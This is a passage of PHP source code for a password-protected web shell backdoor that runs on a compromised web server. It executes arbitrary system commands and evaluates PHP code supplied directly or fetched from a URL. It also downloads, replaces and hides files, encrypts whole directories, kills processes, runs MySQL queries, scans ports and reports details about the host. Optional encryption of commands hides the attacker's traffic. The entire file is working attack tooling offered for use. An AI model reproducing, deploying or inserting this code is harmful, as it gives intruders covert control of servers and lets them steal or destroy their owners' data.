    $prefered = 'shell_exec';
    $functions = 'exec passthru proc_open system';

    if ( !function_exists($prefered) ) {
        foreach (explode(' ', $functions) as $func) {
            if ( function_exists($func) ) {
                return @$func($cmd);
            }
        }
    } else {
        return @$prefered($cmd);
    }
    return false;
};

/**
 * Encrypt/decrypt data using AES 256 CBC.
 * @param $action
 * @param $data
 * @param $secret
 * @param $iv
 * @param string $enc_method
 * @return bool|string
 */
function encryption($action, $data, $secret, $iv, $enc_method = 'AES-256-CBC') {
    $output = false;
    $key = hash('sha256', $secret);
    $iv = substr(hash('sha256', $iv), 0, 16);

    switch ($action) {
        case 'encrypt':
            $output = openssl_encrypt($data, $enc_method, $key, 0, $iv);
            break;
        case 'decrypt':
            $output = openssl_decrypt($data, $enc_method, $key, 0, $iv);
            break;
        default: return $output;
    }
    return $output;
}

/**
 * Class UI
 */
class UI {
    /**
     * Print code formatted message.
     * @param $message
     */
    static public function printMsg($message) {
        if ( ENC_MODE )
            echo encryption("encrypt", $message, SECRET, IV);
        else
            echo "<pre>$message</pre>";
    }

    /**
     * Exit shell.
     * @param $exitMessage
     */
    static public function shellExit($exitMessage) {
        die(self::printMsg($exitMessage));
    }
}

/**
 * Class PatternSearch
 */
class PatternSearch {

    public $pattern;
    public $inputData;
    public $matches;

    /**
     * PatternSearch constructor.
     * @param $pattern
     * @param $inputData
     */
    function __construct($pattern, $inputData) {
        $this->pattern = $pattern;
        $this->matches = array();
        $this->initSearch($inputData);
    }

    /**
     * Return an array as result with matching file, position and line.
     * @param $source
     * @param $found
     * @param $pos
     * @param string $file
     */
    private function returnResult($source, $found, $pos, $file = "") {
        $replaced =
            str_replace($found, "<span style='color:red'><strong>$found</strong></span>", $source);

        $result = array(
            "file" => $file,
            "pos" => $pos,
            "line" => $replaced,
        );
        array_push($this->matches, $result);
    }

    /**
     * Search matching pattern in string.
     * @param $string
     * @param $data
     * @param string $file
     */
    public function stringSearch($string, $data, $file = "") {
        $pos = strpos($data, $string);

        if ( $pos !== false )
            $this->returnResult($data, $string, $pos, $file);
    }

    /**
     * Search matching regex in string.
     * @param $regex
     * @param $data
     * @return mixed
     */
    public function regexSearch($regex, $data) {
        preg_match($regex, $data, $matches, PREG_OFFSET_CAPTURE);
        return $matches; // TODO work with match array
    }

    /**
     * Search matching pattern in file.
     * @param $file
     * @param $pattern
     * @param bool $searchWithRegex
     */
    public function fileSearch($file, $pattern, $searchWithRegex = false) {
        $handle = fopen($file, "r");
        while ( $data = fgets($handle) ) {
            if ( $searchWithRegex ) {
                $this->regexSearch($pattern, $data);
            } else {
                $this->stringSearch($pattern, $data, $file);
            }
        }
        fclose($handle);
    }

    /**
     * Recursively search directory for matching pattern.
     * @param $pattern
     * @param $dir
     * @param bool $searchWithRegex
     */
    public function dirSearch($pattern, $dir, $searchWithRegex = false) {
        $iterator = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator(
                $dir, \RecursiveDirectoryIterator::SKIP_DOTS
            ),
            \RecursiveIteratorIterator::SELF_FIRST,
            \RecursiveIteratorIterator::CATCH_GET_CHILD
        );

        foreach ($iterator as $file => $dir) {
            if ( !$dir->isDir() ) {
                $this->fileSearch($file, $pattern, $searchWithRegex);
            }
        }
    }

    /**
     * Get input type (file or dir).
     * @param $data
     * @return int
     */
    private function getType($data) {
        if ( is_file($data) )
            return 1;
        elseif ( is_dir($data) )
            return 2;
        else return 3;
    }

    /**
     * Initialize new search.
     * @param $inputData
     */
    private function initSearch($inputData) {
        $pattern = $this->pattern;
        switch ( $this->getType($inputData) ) {
            case 1:
                $this->fileSearch($inputData, $pattern);
                break;
            case 2:
                $this->dirSearch($pattern, $inputData);
                break;
            case 3:
                $this->stringSearch($pattern, $inputData);
                break;
        }
    }
}

/**
 * Class FileOperations
 */
class FileOperations {

    /**
     * Convert sizes.
     * @param $size
     * @return string
     */
    static public function convert($size)
    {
        $unit = array('b','kb','mb','gb','tb','pb');
        return @round($size/pow(1024,($i=floor(log($size,1024)))),2).' '.$unit[$i];
    }

    /**
     * Get (download) file from this machine.
     * @param $file
     */
    static public function get($file) {
        if (file_exists($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename='.basename($file));
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            ob_clean();
            flush();
            readfile($file);
            exit;
        } else UI::shellExit('$file not found');
    }

    /**
     * Save file from url to this machine.
     * @param $url
     * @param $new
     */
    static public function urlGet($url, $new) {
        UI::printMsg("Try to download $url to $new");

        $dest = preg_replace('/\s+/', '', $new);
        $data = file_get_contents($url);

        file_put_contents($dest, $data);
        if ( file_exists($dest) )
            UI::printMsg("Saved to $dest");
        else
            UI::printMsg("Error while downloading $url");
    }

    /**
     * Hide file or folder.
     * @param $obj
     */
    static public function hide($obj) {
        UI::printMsg("Try to hide $obj");
        if ( SERVER_OS !== 'win' )
            self::rename($obj, '.'.$obj);
        else
            execCommand('attrib -h '.$obj);
    }

    /**
     * Unhide file or folder.
     * @param $obj
     */
    static public function unhide($obj) {
        UI::printMsg("Try to unhide $obj");
        if ( SERVER_OS !== 'win' )
            self::rename('.'.$obj, $obj);
        else
            execCommand('attrib -h '.$obj);
    }

    /**
     * Delete file or folder.
     * @param $obj
     */
    static public function delete($obj) {
        if ( unlink($obj) )
            UI::printMsg("$obj was successfully deleted");
        else
            UI::printMsg("Error while deleting file $obj");
    }

    /**
     * Create file or folder.
     * @param $file
     */
    static public function create($file) {
        $cf = fopen($file, 'w') or UI::shellExit("Can't create file $file");
        fclose($cf);
        UI::printMsg("Successful created $file");
    }

    /**
     * Copy  file or folder.
     * @param $file
     * @param $new
     */
    static public function copy($file, $new) {
        if ( copy($file, $new) )
            UI::printMsg("$file was successfully copied to $new");
        else
            UI::printMsg("Error while copying file $file");
    }

    /**
     * Rename file or folder.
     * @param $old
     * @param $new
     */
    static public function rename($old, $new) {
        if ( rename($old, $new) )
            UI::printMsg("$old was successfully renamed to $new");
        else
            UI::printMsg("Error while renaming file $old");
    }

    /**
     * View content of file.
     * @param $file
     */
    static public function view($file) {
        UI::printMsg(htmlspecialchars(file_get_contents($file)));
    }

    /**
     * Replace file's content with custom code.
     * @param $file
     * @param $code
     */
    static public function replace($file, $code) {
        file_put_contents($file, $code);
        UI::printMsg("'$code' was written to $file");
    }

    /**
     * Encrypt file using AES 256 CBC.
     * @param $file
     * @param $secret
     * @param $iv
     */
    static public function fileEncrypt($file, $secret, $iv) {
        UI::printMsg("Encrypt file $file [secret:$secret, iv:$iv]");

        $content = file_get_contents($file);
        $encContent = encryption('encrypt', $content, $secret, $iv);

        file_put_contents($file, $encContent);
        self::rename($file, "$file.enc");
    }

    /**
     * Decrypt file using AES 256 CBC.
     * @param $encFile
     * @param $secret
     * @param $iv
     */
    static public function fileDecrypt($encFile, $secret, $iv) {
        UI::printMsg("Decrypt file $encFile [secret:$secret, iv:$iv]");

        $encContent = file_get_contents($encFile);
        $decContent = encryption('decrypt', $encContent, $secret, $iv);

        file_put_contents($encFile, $decContent);

        $newFn = explode('.enc', $encFile)[0];
        self::rename($encFile, $newFn);
    }

    /**
     * Encrypt all file's within directory using AES 256 CBC.
     * @param $dir
     * @param $secret
     * @param $iv
     */
    static public function dirEncrypt($dir, $secret, $iv) {
        $iterator = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator(
                $dir, \RecursiveDirectoryIterator::SKIP_DOTS
            ),
            \RecursiveIteratorIterator::SELF_FIRST,
            \RecursiveIteratorIterator::CATCH_GET_CHILD
        );

        foreach ($iterator as $file => $dir) {
            if (!$dir->isDir()) {
                self::fileEncrypt($file, $secret, $iv);
            }
        }
    }

    /**
     * Decrypt all file's within directory using AES 256 CBC.
     * @param $encDir
     * @param $secret
     * @param $iv
     */
    static public function dirDecrypt($encDir, $secret, $iv) {
        $iterator = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator(
                $encDir, \RecursiveDirectoryIterator::SKIP_DOTS
            ),
            \RecursiveIteratorIterator::SELF_FIRST,
            \RecursiveIteratorIterator::CATCH_GET_CHILD
        );

        foreach ($iterator as $file => $dir) {
            if (!$dir->isDir()) {
                self::fileDecrypt($file, $secret, $iv);
            }
        }
    }

    /**
     * Show file information.
     * @param $file
     */
    static public function finfo($file) {
        $fileInfo = "File information for <strong>$file</strong>:
        
Basename:               ".basename($file)."
Last access:            ".date("d F Y H:i:s", fileatime($file))."
Last changed:           ".date("d F Y H:i:s", filectime($file))."
Group:                  ".filegroup($file)."
File inode:             ".fileinode($file)."
Modification time:      ".date("d F Y H:i:s", filemtime($file))."
Owner:                  ".fileowner($file)."
Permissions:            ".fileperms($file)."
Size:                   ".filesize($file)."
Type:                   ".filetype($file)."
";
        UI::printMsg($fileInfo);
    }

    /**
     * Find pattern in data.
     * @param $pattern
     * @param $data
     */
    static public function find($pattern, $data) {
        $search = new PatternSearch($pattern, $data);
        foreach ($search->matches as $match) {
            // echo "<pre>".$match["file"]." ".$match["pos"].": ".$match["line"]."</pre>";
            UI::printMsg($match["file"]." ".$match["pos"].": ".$match["line"]);
        }
    }
}

/**
 * Class System
 */
class System {

	static public function shutdown() {
		//TODO
	}

    /**
     * Show list of running processes
     */
    static public function tasklist() {
        if ( SERVER_OS !== 'win' )
            UI::printMsg(shell_exec("ps -U root -u root -N"));
        else
            execCommand('tasklist');
    }

    /**
     * Try to kill a system task.
     * @param $pid
     * @param int $sigTerm
     */
    static public function taskkill($pid, $sigTerm=9) {
        if ( SERVER_OS !== 'win' )
            UI::printMsg(shell_exec("kill -$sigTerm $pid"));
        else
            execCommand('taskkill /PID '.$pid);
    }

    /**
     * Show system information
     */
    static public function sysinfo() {
        $sysinfo = "
System information for ".$_SERVER['HTTP_HOST'].":
        
Software:        ".$_SERVER['SERVER_SOFTWARE']."
User agent:      ".$_SERVER['HTTP_USER_AGENT']."
HTTP-accept:     ".$_SERVER['HTTP_ACCEPT']."
HTTP-cookie:     ".$_SERVER['HTTP_COOKIE']."
Document root:   ".$_SERVER['DOCUMENT_ROOT']."
Server admin:    ".$_SERVER['SERVER_ADMIN']."
Remote port:     ".$_SERVER['REMOTE_PORT']."
Gateway iface:   ".$_SERVER['GATEWAY_INTERFACE']."
        ";

        UI::printMsg($sysinfo);
    }

    /**
     * Show machine's geo ip information
     */
    static public function geoinfo() {
        $ip    = file_get_contents('https://api.ipify.org');
        $data  = file_get_contents('http://freegeoip.net/json/'.$ip);
        $json = json_decode($data);

        $geoinfo = "
System information for ".$_SERVER['HTTP_HOST'].":

Ip address:     ".$json->{'ip'}."
Country code:   ".$json->{'country_code'}."
Country name:   ".$json->{'country_name'}."
Region name:    ".$json->{'region_code'}."
Region code:    ".$json->{'region_name'}."
City:           ".$json->{'city'}."
Zip code:       ".$json->{'zip_code'}."
Timezone:       ".$json->{'time_zone'}."
Latitude:       ".$json->{'latitude'}."
Longitude:      ".$json->{'longitude'}."
Metro code:     ".$json->{'metro_code'}."
Map link:       http://www.openstreetmap.org/#map=13/".$json->{'latitude'}."/".$json->{'longitude'}."
        ";

        UI::printMsg(utf8_decode($geoinfo));
    }

    /**
     * Show phpInfo
     */
    static public function phpInfo() {
        UI::printMsg(phpinfo());
    }

    /**
     * Execute mysql query.
     * @param $query
     * @param $username
     * @param $password
     * @param $database
     */
    static public function execQuery($query, $username, $password, $database) {

        $pass = str_replace("'", "", $password);
        $db = str_replace("'", "", $database);

        $conn = mysqli_connect('127.0.0.1', $username, $pass, $db);
        if ( $conn == false )
            UI::shellExit('Could not connect to mysql. '.mysqli_connect_error());

        $result = mysqli_query($conn, $query);

        if ( $result ) {
            // start drawing table
            echo "<pre>";
            $sizes = array();
            $row = mysqli_fetch_assoc($result);

            foreach ( $row as $key => $value ) {
                $sizes[$key] = strlen($key);
            }

            while ( $row = mysqli_fetch_assoc($result) ) {
                foreach ( $row as $key=>$value ) {
                    $length = strlen($value);
                    if ( $length > $sizes[$key] ) $sizes[$key] = $length;
                }
            }
            mysqli_data_seek($result, 0);

            // top
            foreach ( $sizes as $length ) {
                echo "+".str_pad("",$length + 2,"-");
            }
            echo "+<br>";

            // column names
            $row = mysqli_fetch_assoc($result);
            foreach ( $row as $key => $value ) {
                echo "| ";
                echo str_pad($key,$sizes[$key] + 1);
            }
            echo "|<br>";

            // line under column names
            foreach ( $sizes as $length ) {
                echo "+".str_pad("",$length + 2,"-");
            }
            echo "+<br>";

            //output data
            do {
                foreach( $row as $key=>$value ){
                    echo "| ";
                    echo str_pad($value,$sizes[$key] + 1);
                }
                echo "|<br>";
            } while ( $row = mysqli_fetch_assoc($result) );

            // bottom
            foreach ( $sizes as $length ) {
                echo "+".str_pad("",$length + 2,"-");
            }
            echo "+<br>";

            echo "</pre>";
        } else  {
            UI::shellExit('Error while executing query');
            mysqli_error($conn);
        }
        mysqli_close($conn);
    }
}

/**
 * Class Network
 */
class Network {
    /**
     * Scan for open ports.
     * @param $host
     * @param $range
     */
    static public function portScan($host, $range) {
        if ( empty($host) )
            $host = '127.0.0.1';
        else $host = $host;

        UI::printMsg("Perform port scan for $host ($range)");

        $start = explode("-", $range)[0];
        $end   = explode("-", $range)[1];

        for ( $p = $start; $p < $end; $p++ ) {
            if ( @fsockopen($host, $p, $errorno, $errorstr, 0.1) ) {
                $srvName = getservbyport($p, 'tcp');
                if ( empty($srvName) ) $srvName = 'unknown';
                UI::printMsg("[$host] open: <strong>$p</strong>(".$srvName.")");
            }
        }
    }
}

/**
 * Class ShellCore
 */
class ShellCore {

    private $shellCommand;
    private $shellPassword;
    private $useEnc;

    /**
     * ShellCore constructor.
     * @param $shellCommand
     * @param $shellPassword
     * @param bool $useEnc
     */
    function __construct($shellCommand, $shellPassword, $useEnc = false) {
        if ( $useEnc ) {
            $this->shellCommand["session_pwd"] = encryption("decrypt", $shellCommand["session_pwd"], SECRET, IV);
            $this->shellCommand["shell"] = encryption("decrypt", $shellCommand["shell"], SECRET, IV);
        }
        $this->shellCommand = $shellCommand;
        $this->shellPassword = $shellPassword;
        $this->useEnc = $useEnc;
        $this->processAuth($this->shellCommand, $this->shellPassword);
    }

    /**
     * Process shell authorisation.
     * @param $shellCommand
     * @param $shellPassword
     */
    private function processAuth($shellCommand, $shellPassword) {
        if ( $this->useEnc )
            $sessionPwd = encryption("decrypt", $shellCommand['session_pwd'], SECRET, IV);
        else
            $sessionPwd = $shellCommand['session_pwd'];
        if ( $sessionPwd != $shellPassword ) {
            die(EXIT_MESSAGE);
        } else {
            // UI::printMsg("Successful authenticated.", "green");
            $this->processShellCmd($this->shellCommand);
        }
    }

    /**
     * Check if input contains command.
     * @param $input
     * @param $command
     * @return bool
     */
    private function isCommand($input, $command) {
        if ( strncmp($input, $command, strlen($command)) === 0 )
            return true;
        else
            return false;
    }

    /**
     * Process commands.
     * @param $cmd
     */
    private function processShellCmd($cmd) {
        if ( $this->useEnc )
        {
            $command = encryption('decrypt', utf8_decode(htmlspecialchars($cmd['shell'])), SECRET, IV);
        }
        else
        {
            $command = utf8_decode(htmlspecialchars($cmd["shell"]));
        }

        // navbar
        UI::printMsg(
            '<strong>'.SHELL_NAME.'</strong> WebShell | Client: '.$_SERVER['SERVER_SOFTWARE'].
            ' ('.file_get_contents('https://api.ipify.org').') - Local server time: '.date('H:i:s').
            ' ('.date_default_timezone_get().') - CPU: '.getCpuUsage().'- Mem: '.FileOperations::convert(memory_get_usage(true)));
        echo "<hr>";
        UI::printMsg("Output for <strong>".$command."</strong>");

        // start handling commands
        if ( $this->isCommand($command, 'help') )
        {
            UI::printMsg(SHELL_HELP);
        }
        elseif ( $this->isCommand($command, 'remove') )
        {
            $confirmPwd = str_replace("]", "", explode("[", $command)[1]);
            if ( $confirmPwd == PROTECT_PWD ) {
                unlink(basename(__FILE__));
                UI::printMsg("Shell was deleted.");
            } else UI::shellExit("You nedd to confirm removing shell by entering 'PROTECT_PWD'");
        }
        elseif ( $this->isCommand($command, 'get') )
        {
            $file = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::get($file);
        }
        elseif ( $this->isCommand($command, 'urlget') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $url = $args[0];
            $new = $args[1];
            FileOperations::urlGet($url, $new);
        }
        elseif ( $this->isCommand($command, 'hide') )
        {
            $obj = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::hide($obj);
        }
        elseif ( $this->isCommand($command, 'unhide') )
        {
            $obj = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::unhide($obj);
        }
        elseif ( $this->isCommand($command, 'delete') )
        {
            $obj = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::delete($obj);
        }
        elseif ( $this->isCommand($command, 'create') )
        {
            $file = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::create($file);
        }
        elseif ( $this->isCommand($command, 'copy') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $file = $args[0];
            $new = $args[1];
            FileOperations::copy($file, $new);
        }
        elseif ( $this->isCommand($command, 'rename') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $old = $args[0];
            $new = $args[1];
            FileOperations::rename($old, $new);
        }
        elseif ( $this->isCommand($command, 'view') )
        {
            $file = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::view($file);
        }
        elseif ( $this->isCommand($command, 'replace') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $file = $args[0];
            $arg2 = $args[1];
            if (filter_var($arg2, FILTER_VALIDATE_URL) === false) {
                FileOperations::replace($file, $arg2);
            } else {
                UI::printMsg("URL");
                FileOperations::replace($file, file_get_contents($arg2));
            }
        }
        elseif ( $this->isCommand($command, 'encrypt') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $obj = $args[0];
            $secret = $args[1];
            $iv = $args[2];

            if ( is_file($obj) )
                FileOperations::fileEncrypt($obj, $secret, $iv);
            elseif ( is_dir($obj) )
                FileOperations::dirEncrypt($obj, $secret, $iv);
        }
        elseif ( $this->isCommand($command, 'decrypt') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $obj = $args[0];
            $secret = $args[1];
            $iv = $args[2];

            if ( is_file($obj) )
                FileOperations::fileDecrypt($obj, $secret, $iv);
            elseif ( is_dir($obj) )
                FileOperations::dirDecrypt($obj, $secret, $iv);
        }
        elseif ( $this->isCommand($command, 'finfo') )
        {
            $file = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::finfo($file);
        }
        elseif ( $this->isCommand($command, 'find') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $pattern = $args[0];
            $data = preg_replace('/\s+/', '', $args[1]);
            FileOperations::find($pattern, $data);
        }
        elseif ( $this->isCommand($command, 'tasklist') )
        {
            System::tasklist();
        }
        elseif ( $this->isCommand($command, 'taskkill') )
        {
            $task = str_replace("]", "", explode("[", $command)[1]);
            System::taskkill($task);
        }
        elseif ( $this->isCommand($command, 'sysinfo') )
        {
            System::sysinfo();
        }
        elseif ( $this->isCommand($command, 'geoinfo') )
        {
            System::geoinfo();
        }
        elseif ( $this->isCommand($command, 'phpinfo') )
        {
            System::phpInfo();
        }
        elseif ( $this->isCommand($command, 'query') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $query = $args[0];
            $user = $args[1];
            $pass = $args[2];
            $db = $args[3];
            System::execQuery($query, $user, $pass, $db);
        }
        elseif ( $this->isCommand($command, 'eval') )
        {
            $arg = str_replace("]", "", explode("[", $command)[1]);

            if (filter_var($arg, FILTER_VALIDATE_URL) === false) {
                UI::printMsg("> <strong>Raw code:</strong>");
                UI::printMsg($arg);
                UI::printMsg("> <strong>Evaluated code:</strong>");
                echo "<pre>";
                eval("?><?".$arg."?><?");
                echo "</pre>";
            } else {
                $code = file_get_contents($arg);
                UI::printMsg("> <strong>Raw code:</strong>");
                UI::printMsg($code);
                UI::printMsg("> <strong>Evaluated code:</strong>");
                echo "<pre>";
                eval("?><?".$code."?><?");
                echo "</pre>";
            }
        }
        elseif ( $this->isCommand($command, 'pscan') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $host  = $args[0];
            $range = $args[1];
            Network::portScan($host, $range);
        }
        else
        {
            $out = execCommand($command);
            if ( $out == '' )
                UI::shellExit('Wrong command. Request help to see available commands.');
            else
                UI::printMsg($out);
        }
    }
}

// initialize new shell instance
$shell = new ShellCore($_REQUEST, SESSION_PWD, ENC_MODE);
?>
